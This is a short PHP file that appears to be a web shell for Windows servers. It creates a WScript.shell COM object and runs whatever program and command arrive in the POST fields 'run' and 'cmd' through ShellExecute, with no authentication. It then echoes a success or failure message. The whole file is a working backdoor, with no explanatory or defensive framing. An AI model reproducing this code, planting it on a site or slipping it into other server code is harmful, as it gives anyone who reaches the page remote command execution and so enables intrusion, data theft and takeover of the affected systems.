<?php
$shell = new COM("WScript.shell");
if(!empty($_POST['run'])) {
	$run = $_POST['run'];
	$cmd = $_POST['cmd'];
	echo (@$shell->ShellExecute($run,'/c '.$cmd) == '0') ? '成功' : 'Faild'; 
}
	
?>